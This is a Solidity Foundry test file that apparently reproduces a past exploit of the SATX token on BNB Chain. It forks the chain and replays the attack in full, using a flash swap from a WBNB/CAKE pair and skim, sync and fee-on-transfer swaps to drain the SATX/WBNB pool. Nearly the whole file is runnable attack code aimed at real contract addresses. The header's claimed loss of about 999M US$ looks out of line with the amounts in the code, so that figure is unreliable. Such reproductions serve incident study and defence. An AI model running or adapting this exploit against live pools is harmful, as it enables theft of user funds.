// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~999M US$
// Attacker : 0xBEF24B94C205999ea17d2ae4941cE849C9114bfd
// Attack Contract : 0x9C63d6328C8e989c99b8e01DE6825e998778B103
// Vulnerable Contract : 0xFd80a436dA2F4f4C42a5dBFA397064CfEB7D9508
// Attack Tx : https://bscscan.com/tx/0x7e02ee7242a672fb84458d12198fae4122d7029ba64f3673e7800d811a8de93f
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xfd80a436da2f4f4c42a5dbfa397064cfeb7d9508#code

contract ContractTest is Test {
    address public attacker = address(this);
    IERC20 constant SATX = IERC20(0xFd80a436dA2F4f4C42a5dBFA397064CfEB7D9508);
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IPancakePair pair_WBNB_SATX = IPancakePair(0x927d7adF1Bcee0Fa1da868d2d43417Ca7c6577D4);
    IPancakePair pair_WBNB_CAKE = IPancakePair(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    
    function setUp() public {
        vm.createSelectFork("bsc", 37914434-1);
        vm.label(address(SATX), "SATX");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(router), "PancakeSwap Router");
        vm.label(address(pair_WBNB_SATX), "pair_WBNB_SATX");
        vm.label(address(pair_WBNB_CAKE), "pair_WBNB_CAKE");
    }

    function approveAll() public {
        SATX.approve(address(router), type(uint256).max);
        WBNB.approve(address(router), type(uint256).max);
    }
    
    function testExploit() public {
        deal(attacker, 0.900000001 ether);
        WBNB.deposit{value: 0.9 ether}();
        approveAll();
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SATX);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1000000000000000,
            0,
            path,
            attacker,
            type(uint256).max
        );
        uint256 SATX_amount = SATX.balanceOf(attacker);
        router.addLiquidity(
            address(WBNB),
            address(SATX),
            1000000000000000,
            SATX_amount,
            0,
            0,
            attacker,
            type(uint256).max
        );
        pair_WBNB_CAKE.swap(
            0,
            60000000000000000000,
            attacker,
            bytes("1")
        );

        uint256 WBNB_amount = WBNB.balanceOf(attacker);
        WBNB.withdraw(WBNB_amount);
    }
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        if(msg.sender == address(pair_WBNB_CAKE)){
            uint256 SATX_amount = SATX.balanceOf(address(pair_WBNB_SATX));
            pair_WBNB_SATX.swap(
                100000000000000,
                SATX_amount/2,
                attacker,
                data
            );

            uint256 SATX_amount_1 = SATX.balanceOf(attacker);
            SATX.transfer(address(pair_WBNB_SATX), SATX_amount_1);
            pair_WBNB_SATX.skim(attacker);
            pair_WBNB_SATX.sync();
            WBNB.transfer(address(pair_WBNB_SATX), 100000000000000);
            uint256 SATX_amount_2 = SATX.balanceOf(attacker);
            address[] memory path = new address[](2);
            path[0] = address(SATX);
            path[1] = address(WBNB);
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                SATX_amount_2,
                0,
                path,
                attacker,
                type(uint256).max
            );
            WBNB.transfer(address(pair_WBNB_CAKE), 60150600000000000000);
        }else if(msg.sender == address(pair_WBNB_SATX)){
            WBNB.transfer(address(pair_WBNB_SATX), 52000000000000000000);
        }
        
    }

    fallback() external payable {}
}


